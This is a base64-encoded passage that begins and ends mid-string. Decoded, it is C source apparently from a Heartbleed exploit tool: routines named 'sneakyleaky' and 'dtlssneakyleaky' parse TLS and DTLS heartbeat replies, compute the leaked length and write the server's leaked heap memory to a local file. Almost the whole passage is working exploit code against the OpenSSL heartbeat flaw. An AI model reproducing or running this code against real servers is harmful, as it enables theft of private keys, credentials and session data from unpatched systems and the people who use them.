ZGxlLT5tc2dfY2FsbGJhY2spDQoJCQljLT5zc2xIYW5kbGUtPm1zZ19jYWxsYmFjaygxLCBjLT5zc2xIYW5kbGUtPnZlcnNpb24sIFRMUzFfUlRfSEVBUlRCRUFULA0KCQkJCWJ1ZiwgMyArIDE2LA0KCQkJCWMtPnNzbEhhbmRsZSwgYy0+c3NsSGFuZGxlLT5tc2dfY2FsbGJhY2tfYXJnKTsNCg0KCQlkdGxzMV9zdGFydF90aW1lcihjLT5zc2xIYW5kbGUpOw0KCQljLT5zc2xIYW5kbGUtPnRsc2V4dF9oYl9wZW5kaW5nID0gMTsNCgkJfQ0KDQogICAgICAgIE9QRU5TU0xfZnJlZShidWYpOw0KDQoJcmV0dXJuIGM7DQp9DQoNCnZvaWQqIHNuZWFreWxlYWt5KGNvbm5lY3Rpb24gKmMsY2hhciogZmlsZW5hbWUsIGludCB2ZXJib3NlKXsNCgljaGFyICpwOw0KICAgICAgICBpbnQgc3NsX21ham9yLHNzbF9taW5vcixhbDsNCiAgICAgICAgaW50IGVuY19lcnIsbixpOw0KICAgICAgICBTU0wzX1JFQ09SRCAqcnI7DQogICAgICAgIFNTTF9TRVNTSU9OICpzZXNzOw0KCVNTTCogczsNCiAgICAgICAgdW5zaWduZWQgY2hhciBtZFtFVlBfTUFYX01EX1NJWkVdOw0KICAgICAgICBzaG9ydCB2ZXJzaW9uOw0KICAgICAgICB1bnNpZ25lZCBtYWNfc2l6ZSwgb3JpZ19sZW47DQogICAgICAgIHNpemVfdCBleHRyYTsNCiAgICAgICAgcnI9ICYoYy0+c3NsSGFuZGxlLT5zMy0+cnJlYyk7DQogICAgICAgIHNlc3M9Yy0+c3NsSGFuZGxlLT5zZXNzaW9uOw0KICAgICAgICBzID0gYy0+c3NsSGFuZGxlOw0KICAgICAgICBpZiAoYy0+c3NsSGFuZGxlLT5vcHRpb25zICYgU1NMX09QX01JQ1JPU09GVF9CSUdfU1NMVjNfQlVGRkVSKQ0KICAgICAgICAgICAgICAgIGV4dHJhPVNTTDNfUlRfTUFYX0VYVFJBOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgZXh0cmE9MDsNCiAgICAgICAgaWYgKChzLT5yc3RhdGUgIT0gU1NMX1NUX1JFQURfQk9EWSkgfHwNCiAgICAgICAgICAgICAgICAocy0+cGFja2V0X2xlbmd0aCA8IFNTTDNfUlRfSEVBREVSX0xFTkdUSCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIG49c3NsM19yZWFkX24ocywgU1NMM19SVF9IRUFERVJfTEVOR1RILCBzLT5zMy0+cmJ1Zi5sZW4sIDApOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG4gPD0gMCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ290byBhcHBsZTsgDQogICAgICAgICAgICAgICAgICAgICAgICBzLT5yc3RhdGU9U1NMX1NUX1JFQURfQk9EWTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHA9cy0+cGFja2V0Ow0KICAgICAgICAgICAgICAgICAgICAgICAgcnItPnR5cGU9ICoocCsrKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNzbF9tYWpvcj0gKihwKyspOw0KICAgICAgICAgICAgICAgICAgICAgICAgc3NsX21pbm9yPSAqKHArKyk7DQogICAgICAgICAgICAgICAgICAgICAgICB2ZXJzaW9uPShzc2xfbWFqb3I8PDgpfHNzbF9taW5vcjsNCiAgICAgICAgICAgICAgICAgICAgICAgIG4ycyhwLHJyLT5sZW5ndGgpOw0KCQkJaWYocnItPnR5cGU9PTI0KXsNCgkJCQlwcmludGYoIlsgaGVhcnRiZWF0IHJldHVybmVkIHR5cGU9JWQgbGVuZ3RoPSV1XG4iLHJyLT50eXBlLCByci0+bGVuZ3RoKTsNCgkJCQlpZihyci0+bGVuZ3RoID4gMTY4MzQpew0KCQkJCQlwcmludGYoIlsgZXJyb3I6IGdvdCBhIG1hbGZvcm1lZCBUTFMgbGVuZ3RoLlxuIik7DQoJCQkJCWV4aXQoMCk7DQoJCQkJfQ0KCQkJfQ0KCQkJZWxzZXsNCgkJCQlwcmludGYoIlsgaW5jb3JyZWN0IHJlY29yZCB0eXBlPSVkIGxlbmd0aD0ldSByZXR1cm5lZFxuIixyci0+dHlwZSxyci0+bGVuZ3RoKTsNCgkJCQlzLT5wYWNrZXRfbGVuZ3RoPTA7DQoJCQkJYmFkcGFja2V0cysrOw0KCQkJCWlmKGJhZHBhY2tldHMgPiAzKXsNCgkJCQkJcHJpbnRmKCJbIGVycm9yOiB0b28gbWFueSBiYWQgcGFja2V0cyByZWNpZXZlZFxuIik7DQoJCQkJCWV4aXQoMCk7DQoJCQkJfQ0KCQkJCWdvdG8gYXBwbGU7DQoJCQl9DQogICAgICAgIH0NCiAgICAgICAgaWYgKHJyLT5sZW5ndGggPiBzLT5wYWNrZXRfbGVuZ3RoLVNTTDNfUlRfSEVBREVSX0xFTkdUSCl7DQogICAgICAgICAgICAgICAgaT1yci0+bGVuZ3RoOw0KICAgICAgICAgICAgICAgIG49c3NsM19yZWFkX24ocyxpLGksMSk7DQogICAgICAgICAgICAgICAgaWYgKG4gPD0gMCkgZ290byBhcHBsZTsgDQogICAgICAgIH0NCglwcmludGYoIlsgZGVjcnlwdGluZyBTU0wgcGFja2V0XG4iKTsNCiAgICAgICAgcy0+cnN0YXRlPVNTTF9TVF9SRUFEX0hFQURFUjsgDQogICAgICAgIHJyLT5pbnB1dD0gJihzLT5wYWNrZXRbU1NMM19SVF9IRUFERVJfTEVOR1RIXSk7DQogICAgICAgIHJyLT5kYXRhPXJyLT5pbnB1dDsNCiAgICAgICAgdGxzMV9lbmMocywwKTsNCiAgICAgICAgaWYoKHNlc3MgIT0gTlVMTCkgJiYNCiAgICAgICAgICAgIChzLT5lbmNfcmVhZF9jdHggIT0gTlVMTCkgJiYNCiAgICAgICAgICAgIChFVlBfTURfQ1RYX21kKHMtPnJlYWRfaGFzaCkgIT0gTlVMTCkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHVuc2lnbmVkIGNoYXIgKm1hYyA9IE5VTEw7DQogICAgICAgICAgICAgICAgdW5zaWduZWQgY2hhciBtYWNfdG1wW0VWUF9NQVhfTURfU0laRV07DQogICAgICAgICAgICAgICAgbWFjX3NpemU9RVZQX01EX0NUWF9zaXplKHMtPnJlYWRfaGFzaCk7DQogICAgICAgICAgICAgICAgT1BFTlNTTF9hc3NlcnQobWFjX3NpemUgPD0gRVZQX01BWF9NRF9TSVpFKTsNCiAgICAgICAgICAgICAgICBvcmlnX2xlbiA9IHJyLT5sZW5ndGgrKCh1bnNpZ25lZCBpbnQpcnItPnR5cGU+PjgpOw0KICAgICAgICAgICAgICAgIGlmKG9yaWdfbGVuIDwgbWFjX3NpemUgfHwNCiAgICAgICAgICAgICAgICAgIChFVlBfQ0lQSEVSX0NUWF9tb2RlKHMtPmVuY19yZWFkX2N0eCkgPT0gRVZQX0NJUEhfQ0JDX01PREUgJiYNCiAgICAgICAgICAgICAgICAgICBvcmlnX2xlbiA8IG1hY19zaXplKzEpKXsNCiAgICAgICAgICAgICAgICAgICAgICAgIGFsPVNTTF9BRF9ERUNPREVfRVJST1I7DQogICAgICAgICAgICAgICAgICAgICAgICBTU0xlcnIoU1NMX0ZfU1NMM19HRVRfUkVDT1JELFNTTF9SX0xFTkdUSF9UT09fU0hPUlQpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoRVZQX0NJUEhFUl9DVFhfbW9kZShzLT5lbmNfcmVhZF9jdHgpID09IEVWUF9DSVBIX0NCQ19NT0RFKXsNCiAgICAgICAgICAgICAgICAgICAgICAgIG1hYyA9IG1hY190bXA7DQogICAgICAgICAgICAgICAgICAgICAgICBzc2wzX2NiY19jb3B5X21hYyhtYWNfdG1wLCByciwgbWFjX3NpemUsIG9yaWdfbGVuKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJyLT5sZW5ndGggLT0gbWFjX3NpemU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2V7DQogICAgICAgICAgICAgICAgICAgICAgICByci0+bGVuZ3RoIC09IG1hY19zaXplOw0KICAgICAgICAgICAgICAgICAgICAgICAgbWFjID0gJnJyLT5kYXRhW3JyLT5sZW5ndGhdOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpID0gdGxzMV9tYWMocyxtZCwwKTsNCiAgICAgICAgICAgICAgICBpZiAoaSA8IDAgfHwgbWFjID09IE5VTEwgfHwgQ1JZUFRPX21lbWNtcChtZCwgbWFjLCAoc2l6ZV90KW1hY19zaXplKSAhPSAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZW5jX2VyciA9IC0xOw0KICAgICAgICAgICAgICAgIGlmIChyci0+bGVuZ3RoID4gU1NMM19SVF9NQVhfQ09NUFJFU1NFRF9MRU5HVEgrZXh0cmErbWFjX3NpemUpDQogICAgICAgICAgICAgICAgICAgICAgICBlbmNfZXJyID0gLTE7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICBpZihlbmNfZXJyIDwgMCl7DQogICAgICAgICAgICAgICAgYWw9U1NMX0FEX0JBRF9SRUNPUkRfTUFDOw0KICAgICAgICAgICAgICAgIFNTTGVycihTU0xfRl9TU0wzX0dFVF9SRUNPUkQsU1NMX1JfREVDUllQVElPTl9GQUlMRURfT1JfQkFEX1JFQ09SRF9NQUMpOw0KICAgICAgICAgICAgICAgIGdvdG8gYXBwbGU7DQogICAgICAgIH0NCiAgICAgICAgaWYocy0+ZXhwYW5kICE9IE5VTEwpew0KICAgICAgICAgICAgICAgIGlmIChyci0+bGVuZ3RoID4gU1NMM19SVF9NQVhfQ09NUFJFU1NFRF9MRU5HVEgrZXh0cmEpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGFsPVNTTF9BRF9SRUNPUkRfT1ZFUkZMT1c7DQogICAgICAgICAgICAgICAgICAgICAgICBTU0xlcnIoU1NMX0ZfU1NMM19HRVRfUkVDT1JELFNTTF9SX0NPTVBSRVNTRURfTEVOR1RIX1RPT19MT05HKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gYXBwbGU7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCFzc2wzX2RvX3VuY29tcHJlc3MocykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGFsPVNTTF9BRF9ERUNPTVBSRVNTSU9OX0ZBSUxVUkU7DQogICAgICAgICAgICAgICAgICAgICAgICBTU0xlcnIoU1NMX0ZfU1NMM19HRVRfUkVDT1JELFNTTF9SX0JBRF9ERUNPTVBSRVNTSU9OKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gYXBwbGU7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICBpZiAocnItPmxlbmd0aCA+IFNTTDNfUlRfTUFYX1BMQUlOX0xFTkdUSCtleHRyYSkgew0KICAgICAgICAgICAgICAgIGFsPVNTTF9BRF9SRUNPUkRfT1ZFUkZMT1c7DQogICAgICAgICAgICAgICAgU1NMZXJyKFNTTF9GX1NTTDNfR0VUX1JFQ09SRCxTU0xfUl9EQVRBX0xFTkdUSF9UT09fTE9ORyk7DQogICAgICAgICAgICAgICAgZ290byBhcHBsZTsNCiAgICAgICAgfQ0KICAgICAgICByci0+b2ZmPTA7DQogICAgICAgIHMtPnBhY2tldF9sZW5ndGg9MDsNCglpZihmaXJzdD09MCl7DQoJCXVpbnQgaGVhcnRibGVlZF9sZW4gPSAwOw0KCQljaGFyKiBmcCA9IHMtPnMzLT5ycmVjLmRhdGE7DQoJCShsb25nKWZwKys7DQoJCW1lbWNweSgmaGVhcnRibGVlZF9sZW4sZnAsMik7DQoJCWhlYXJ0YmxlZWRfbGVuID0gKGhlYXJ0YmxlZWRfbGVuICYgMHhmZikgPDwgOCB8IChoZWFydGJsZWVkX2xlbiAmIDB4ZmYwMCkgPj4gODsNCgkJZmlyc3QgPSAyOw0KCQlsZWFrYnl0ZXMgPSBoZWFydGJsZWVkX2xlbiArIDE2Ow0KCQlwcmludGYoIlsgaGVhcnRibGVlZCBsZWFrZWQgbGVuZ3RoPSV1XG4iLGhlYXJ0YmxlZWRfbGVuKTsNCgl9DQoJaWYodmVyYm9zZT09MSl7DQoJCXsgdW5zaWduZWQgaW50IHo7IGZvciAoej0wOyB6PHJyLT5sZW5ndGg7IHorKykgcHJpbnRmKCIlMDJYJWMiLHJyLT5kYXRhW3pdLCgoeisxKSUxNik/JyAnOidcbicpOyB9DQogICAgICAgICAgICAgICAgcHJpbnRmKCJcbiIpOw0KICAgICAgICB9DQoJbGVha2J5dGVzLT1yci0+bGVuZ3RoOw0KCWlmKGxlYWtieXRlcyA+IDApew0KCQlyZXBlYXQgPSAxOw0KCX0NCgllbHNlew0KCQlyZXBlYXQgPSAwOw0KCX0NCglwcmludGYoIlsgZmluYWwgcmVjb3JkIHR5cGU9JWQsIGxlbmd0aD0ldVxuIiwgcnItPnR5cGUsIHJyLT5sZW5ndGgpOw0KCWludCBvdXRwdXQgPSBzLT5zMy0+cnJlYy5sZW5ndGgtMzsNCglpZihvdXRwdXQgPiAwKXsNCgkJaW50IGZkID0gb3BlbihmaWxlbmFtZSxPX1JEV1J8T19DUkVBVHxPX0FQUEVORCwwNzAwKTsNCgkgICAgICAgIGlmKGZpcnN0PT0yKXsNCgkJCWZpcnN0LS07DQoJCQl3cml0ZShmZCxzLT5zMy0+cnJlYy5kYXRhKzMscy0+czMtPnJyZWMubGVuZ3RoKTsNCgkJCS8qIGZpcnN0IHRocmVlIGJ5dGVzIGFyZSByZXNwK2xlbiAqLw0KCQkJcHJpbnRmKCJbIHdyb3RlICVkIGJ5dGVzIG9mIGhlYXAgdG8gZmlsZSAnJXMnXG4iLHMtPnMzLT5ycmVjLmxlbmd0aC0zLGZpbGVuYW1lKTsNCgkJfQ0KCQllbHNlew0KCQkJLyogaGVhcCBkYXRhICYgMTYgYnl0ZXMgcGFkZGluZyAqLw0KCQkJd3JpdGUoZmQscy0+czMtPnJyZWMuZGF0YSszLHMtPnMzLT5ycmVjLmxlbmd0aCk7DQoJCQlwcmludGYoIlsgd3JvdGUgJWQgYnl0ZXMgb2YgaGVhcCB0byBmaWxlICclcydcbiIscy0+czMtPnJyZWMubGVuZ3RoLGZpbGVuYW1lKTsNCgkJfQ0KCQljbG9zZShmZCk7DQoJfQ0KCWVsc2V7DQoJCXByaW50ZigiWyBub3RoaW5nIGZyb20gdGhlIGhlYXAgdG8gd3JpdGVcbiIpOw0KCX0NCglyZXR1cm47DQphcHBsZToNCiAgICAgICAgcHJpbnRmKCJbIHByb2JsZW0gaGFuZGxpbmcgU1NMIHJlY29yZCBwYWNrZXQgLSB3cm9uZyB0eXBlP1xuIik7DQoJYmFkcGFja2V0cysrOw0KCWlmKGJhZHBhY2tldHMgPiAzKXsNCgkJcHJpbnRmKCJbIGVycm9yOiB0b28gbWFueSBiYWQgcGFja2V0cyByZWNpZXZlZFxuIik7DQoJCWV4aXQoMCk7DQoJfQ0KCXJldHVybjsNCn0NCg0KDQp2b2lkKiBkdGxzc25lYWt5bGVha3koY29ubmVjdGlvbiAqYyxjaGFyKiBmaWxlbmFtZSwgaW50IHZlcmJvc2Upew0KCWNoYXIgKnA7DQogICAgICAgIGludCBzc2xfbWFqb3Isc3NsX21pbm9yLGFsOw0KICAgICAgICBpbnQgZW5jX2VycixuLGk7DQogICAgICAgIFNTTDNfUkVDT1JEICpycjsNCiAgICAgICAgU1NMX1NFU1NJT04gKnNlc3M7DQoJU1NMKiBzOw0KCURUTFMxX0JJVE1BUCAqYml0bWFwOw0KCXVuc2lnbmVkIGludCBpc19uZXh0X2Vwb2NoOw0KICAgICAgICB1bnNpZ25lZCBjaGFyIG1kW0VWUF9NQVhfTURfU0laRV07DQogICAgICAgIHNob3J0IHZlcnNpb247DQogICAgICAgIHVuc2lnbmVkIGludCBtYWNfc2l6ZSwgb3JpZ19sZW47DQoNCiAgICAgICAgcnI9ICYoYy0+c3NsSGFuZGxlLT5zMy0+cnJlYyk7DQogICAgICAgIHNlc3M9Yy0+c3NsSGFuZGxlLT5zZXNzaW9uOw0KICAgICAgICBzID0gYy0+c3NsSGFuZGxlOw0KDQphZ2FpbjoNCiAgICAgICAgaWYgKChzLT5yc3RhdGUgIT0gU1NMX1NUX1JFQURfQk9EWSkgfHwNCiAgICAgICAgICAgICAgICAocy0+cGFja2V0X2xlbmd0aCA8IERUTFMxX1JUX0hFQURFUl9MRU5HVEgpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBuPXNzbDNfcmVhZF9uKHMsIERUTFMxX1JUX0hFQURFUl9MRU5HVEgsIHMtPnMzLT5yYnVmLmxlbiwgMCk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAobiA8PSAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnb3RvIGFwcGxlOyANCg0KICAgICAgICAgICAgICAgICAgICAgICAgcy0+cnN0YXRlPVNTTF9TVF9SRUFEX0JPRFk7DQogICAgICAgICAgICAgICAgICAgICAgICBwPXMtPnBhY2tldDsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJyLT50eXBlPSAqKHArKyk7DQogICAgICAgICAgICAgICAgICAgICAgICBzc2xfbWFqb3I9ICoocCsrKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNzbF9taW5vcj0gKihwKyspOw0KICAgICAgICAgICAgICAgICAgICAgICAgdmVyc2lvbj0oc3NsX21ham9yPDw4KXxzc2xfbWlub3I7DQoJCQluMnMocCxyci0+ZXBvY2gpOw0KCQkJbWVtY3B5KCYocy0+czMtPnJlYWRfc2VxdWVuY2VbMl0pLCBwLCA2KTsNCgkJCXArPTY7DQogICAgICAgICAgICAgICAgICAgICAgICBuMnMocCxyci0+bGVuZ3RoKTsNCgkJCWlmKHJyLT50eXBlPT0yNCl7DQoJCQkJcHJpbnRmKCJbIGhlYXJ0YmVhdCByZXR1cm5lZCB0eXBlPSVkIGxlbmd0aD0ldVxuIixyci0+dHlwZSwgcnItPmxlbmd0aCk7DQoJCQkJaWYocnItPmxlbmd0aCA+IDE2ODM0KXsNCgkJCQkJcHJpbnRmKCJbIGVycm9yOiBnb3QgYSBtYWxmb3JtZWQgVExTIGxlbmd0aC5cbiIpOw0KCQkJCQlleGl0KDApOw0KCQkJCX0NCgkJCX0NCgkJCWVsc2V7DQoJCQkJcHJpbnRmKCJbIGluY29ycmVjdCByZWNvcmQgdHlwZT0lZCBsZW5ndGg9JXUgcmV0dXJuZWRcbiIscnItPnR5cGUscnItPmxlbmd0aCk7DQoJCQkJcy0+cGFja2V0X2xlbmd0aD0wOw0KCQkJCWJhZHBhY2tldHMrKzsNCgkJCQlpZihiYWRwYWNrZXRzID4gMyl7DQoJCQkJCXByaW50ZigiWyBlcnJvcjogdG9vIG1hbnkgYmFkIHBhY2tldHMgcmVjaWV2ZWRcbiIpOw0KCQkJCQlleGl0KDApOw0KCQkJCX0NCgkJCQlnb3RvIGFwcGxlOw0KCQkJfQ0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKHJyLT5sZW5ndGggPiBzLT5wYWNrZXRfbGVuZ3RoLURUTFMxX1JUX0hFQURFUl9MRU5HVEgpew0KICAgICAgICAgICAgICAgIGk9cnItPmxlbmd0aDsNCiAgICAgICAgICAgICAgICBuPXNzbDNfcmVhZF9uKHMsaSxpLDEpOw0KICAgICAgICAgICAgICAgIGlmIChuIDw9IDApIGdvdG8gYXBwbGU7IA0KICAgICAgICB9DQoJCWlmICggbiAhPSBpKQ0KCQkJew0KCQkJcnItPmxlbmd0aCA9IDA7DQoJCQlzLT5wYWNrZXRfbGVuZ3RoID0gMDsNCgkJCWdvdG8gYWdhaW47DQoJCQl9DQoJcHJpbnRmKCJbIGRlY3J5cHRpbmcgU1NMIHBhY2tldFxuIik7DQogICAgICAgIHMtPnJzdGF0ZT1TU0xfU1RfUkVBRF9IRUFERVI7IA0KDQoJYml0bWFwID0gZHRsczFfZ2V0X2JpdG1hcChzLCByciwgJmlzX25leHRfZXBvY2gpOw0KCWlmICggYml0bWFwID09IE5VTEwpDQoJCXsNCgkJcnItPmxlbmd0aCA9IDA7DQoJCXMtPnBhY2tldF9sZW5ndGggPSAwOw0KCQlnb3RvIGFnYWluOw0KCQl9DQoNCgkJaWYgKCEocy0+ZDEtPmxpc3RlbiAmJiByci0+dHlwZSA9PSBTU0wzX1JUX0hBTkRTSEFLRSAmJg0KCQkgICAgKnAgPT0gU1NMM19NVF9DTElFTlRfSEVMTE8pICYmDQoJCSAgICAhZHRsczFfcmVjb3JkX3JlcGxheV9jaGVjayhzLCBiaXRtYXApKQ0KCQkJew0KCQkJcnItPmxlbmd0aCA9IDA7DQoJCQlzLT5wYWNrZXRfbGVuZ3RoPTA7DQoJCQlnb3RvIGFnYWluOw0KCQkJfQ0KDQoJaWYgKHJyLT5sZW5ndGggPT0gMCkgZ290byBhZ2FpbjsNCmlmIChpc19uZXh0X2Vwb2NoKQ0KCQl7DQoJCWlmICgoU1NMX2luX2luaXQocykgfHwgcy0+aW5faGFuZHNoYWtlKSAmJiAhcy0+ZDEtPmxpc3RlbikNCgkJCXsNCgkJCWR0bHMxX2J1ZmZlcl9yZWNvcmQocywgJihzLT5kMS0+dW5wcm9jZXNzZWRfcmNkcyksIHJyLT5zZXFfbnVtKTsNCgkJCX0NCgkJcnItPmxlbmd0aCA9IDA7DQoJCXMtPnBhY2tldF9sZW5ndGggPSAwOw0KCQlnb3RvIGFnYWluOw0KCQl9DQoNCg0KICAgICAgICByci0+aW5wdXQ9ICYocy0+cGFja2V0W0RUTFMxX1JUX0hFQURFUl9MRU5HVEhdKTsNCiAgICAgICAgcnItPmRhdGE9cnItPmlucHV0Ow0KCW9yaWdfbGVuPXJyLT5sZW5ndGg7DQoNCiAgICAgICAgZHRsczFfZW5jKHMsMCk7DQoNCiAgICAgICAgaWYoKHNlc3MgIT0gTlVMTCkgJiYNCiAgICAgICAgICAgIChzLT5lbmNfcmVhZF9jdHggIT0gTlVMTCkgJiYNCiAgICAgICAgICAgIChFVlBfTURfQ1RYX21kKHMtPnJlYWRfaGFzaCkgIT0gTlVMTCkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHVuc2lnbmVkIGNoYXIgKm1hYyA9IE5VTEw7DQogICAgICAgICAgICAgICAgdW5zaWduZWQgY2hhciBtYWNfdG1wW0VWUF9NQVhfTURfU0laRV07DQogICAgICAgICAgICAgICAgbWFjX3NpemU9RVZQX01EX0NUWF9zaXplKHMtPnJlYWRfaGFzaCk7DQogICAgICAgICAgICAgICAgT1BFTlNTTF9hc3NlcnQobWFjX3NpemUgPD0gRVZQX01BWF9NRF9TSVpFKTsNCiAgICAgICAgICAgICAgICBvcmlnX2xlbiA9IHJyLT5sZW5ndGgrKCh1bnNpZ25lZCBpbnQpcnItPnR5cGU+PjgpOw0KICAgICAgICAgICAgICAgIGlmKG9yaWdfbGVuIDwgbWFjX3NpemUgfHwNCiAgICAgICAgICAgICAgICAgIChFVlBfQ0lQSEVSX0NUWF9tb2RlKHMtPmVuY19yZWFkX2N0eCkgPT0gRVZQX0NJUEhfQ0JDX01PREUgJiYNCiAgICAgICAgICAgICAgICAgICBvcmlnX2xlbiA8IG1hY19zaXplKzEpKXsNCiAgICAgICAgICAgICAgICAgICAgICAgIGFsPVNTTF9BRF9ERUNPREVfRVJST1I7DQogICAgICAgICAgICAgICAgICAgICAgICBTU0xlcnIoU1NMX0ZfU1NMM19HRVRfUkVDT1JELFNTTF9SX0xFTkdUSF9UT09fU0hPUlQpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoRVZQX0NJUEhFUl9DVFhfbW9kZShzLT5lbmNfcmVhZF9jdHgpID09IEVWUF9DSVBIX0NCQ19NT0RFKXsNCiAgICAgICAgICAgICAgICAgICAgICAgIG1hYyA9IG1hY190bXA7DQogICAgICAgICAgICAgICAgICAgICAgICBzc2wzX2NiY19jb3B5X21hYyhtYWNfdG1wLCByciwgbWFjX3NpemUsIG9yaWdfbGVuKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJyLT5sZW5ndGggLT0gbWFjX3NpemU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2V7DQogICAgICAgICAgICAgICAgICAgICAgICByci0+bGVuZ3RoIC09IG1hY19zaXplOw0KICAgICAgICAgICAgICAgICAgICAgICAgbWFjID0gJnJyLT5kYXRhW3JyLT5sZW5ndGhdOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpID0gdGxzMV9tYWMocyxtZCwwKTsNCg0KICAgICAgICAgICAgICAgIGlmIChpIDwgMCB8fCBtYWMgPT0gTlVMTCB8fCBDUllQVE9fbWVtY21wKG1kLCBtYWMsIChzaXplX3QpbWFjX3NpemUpICE9IDApDQogICAgICAgICAgICAgICAgICAgICAgICBlbmNfZXJyID0gLTE7DQoNCiAgICAgICAgICAgICAgICBpZiAocnItPmxlbmd0aCA+IFNTTDNfUlRfTUFYX0NPTVBSRVNTRURfTEVOR1RIK21hY19zaXplKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZW5jX2VyciA9IC0xOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgaWYoZW5jX2VyciA8IDApew0KICAgICAgICAgICAgICAgIGFsPVNTTF9BRF9CQURfUkVDT1JEX01BQzsNCiAgICAgICAgICAgICAgICBTU0xlcnIoU1NMX0ZfU1NMM19HRVRfUkVDT1JELFNTTF9SX0RFQ1JZUFRJT05fRkFJTEVEX09SX0JBRF9SRUNPUkRfTUFDKTsNCiAgICAgICAgICAgICAgICBnb3RvIGFwcGxlOw0KICAgICAgICB9DQogICAgICAgIGlmKHMtPmV4cGFuZCAhPSBOVUxMKXsNCiAgICAgICAgICAgICAgICBpZiAocnItPmxlbmd0aCA+IFNTTDNfUlRfTUFYX0NPTVBSRVNTRURfTEVOR1RIKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBhbD1TU0xfQURfUkVDT1JEX09WRVJGTE9XOw0KICAgICAgICAgICAgICAgICAgICAgICAgU1NMZXJyKFNTTF9GX1NTTDNfR0VUX1JFQ09SRCxTU0xfUl9DT01QUkVTU0VEX0xFTkdUSF9UT09fTE9ORyk7DQogICAgICAgICAgICAgICAgICAgICAgICBnb3RvIGFwcGxlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICghc3NsM19kb191bmNvbXByZXNzKHMpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBhbD1TU0xfQURfREVDT01QUkVTU0lPTl9GQUlMVVJFOw0KICAgICAgICAgICAgICAgICAgICAgICAgU1NMZXJyKFNTTF9GX1NTTDNfR0VUX1JFQ09SRCxTU0xfUl9CQURfREVDT01QUkVTU0lPTik7DQogICAgICAgICAgICAgICAgICAgICAgICBnb3RvIGFwcGxlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICBpZiAocnItPmxlbmd0aCA+IFNTTDNfUlRfTUFYX1BMQUlOX0xFTkdUSCkgew0KICAgICAgICAgICAgICAgIGFsPVNTTF9BRF9SRUNPUkRfT1ZFUkZMT1c7DQogICAgICAgICAgICAgICAgU1NMZXJyKFNTTF9GX1NTTDNfR0VUX1JFQ09SRCxTU0xfUl9EQVRBX0xFTkdUSF9UT09fTE9ORyk7DQogICAgICAgICAgICAgICAgZ290byBhcHBsZTsNCiAgICAgICAgfQ0KICAgICAgICByci0+b2ZmPTA7DQogICAgICAgIHMtPnBhY2tldF9sZW5ndGg9MDsNCglkdGxzMV9yZWNvcmRfYml0bWFwX3VwZGF0ZShzLCAmKHMtPmQxLT5iaXRtYXApKTsNCglpZihmaXJzdD09MCl7DQoJCXVpbnQgaGVhcnRibGVlZF9sZW4gPSAwOw0KCQljaGFyKiBmcCA9IHMtPnMzLT5ycmVjLmRhdGE7DQoJCShsb25nKWZwKys7DQoJCW1lbWNweSgmaGVhcnRibGVlZF9sZW4sZnAsMik7DQoJCWhlYXJ0YmxlZWRfbGVuID0gKGhlYXJ0YmxlZWRfbGVuICYgMHhmZikgPDwgOCB8IChoZWFydGJsZWVkX2xlbiAmIDB4ZmYwMCkgPj4gODsNCgkJZmlyc3QgPSAyOw0KCQlsZWFrYnl0ZXMgPSBoZWFydGJsZWVkX2xlbiArIDE2Ow0KCQlwcmludGYoIlsgaGVhcnRibGVlZCBsZWFrZWQgbGVuZ3RoPSV1XG4iLGhlYXJ0YmxlZWRfbGVuKTsNCgl9DQoJaWYodmVyYm9zZT09MSl7DQoJCXsgdW5zaWduZWQgaW50IHo7IGZvciAoej0wOyB6PHJyLT5sZW5ndGg7IHorKykgcHJpbnRmKCIlMDJYJWMiLHJyLT5kYXRhW3pdLCgoeisxKSUxNik/JyAnOidcbicpOyB9DQogICAgICAgICAgICAgICAgcHJpbnRmKCJcbiIpOw0KICAgICAgICB9DQoJbGVha2J5dGVzLT1yci0+bGVuZ3RoOw0KCWlmKGxlYWtieXRlcyA+IDApew0KCQlyZXBlYXQgPSAxOw0KCX0NCgllbHNlew0KCQlyZXBlYXQgPSAwOw0KCX0NCglwcmludGYoIlsgZmluYWwgcmVjb3JkIHR5cGU9JWQsIGxlbmd0aD0ldVxuIiwgcnItPnR5cGUsIHJyLT5sZW5ndGgpOw0KCWludCBvdXRwdXQgPSBzLT5zMy0+cnJlYy5sZW5ndGgtMzsNCgl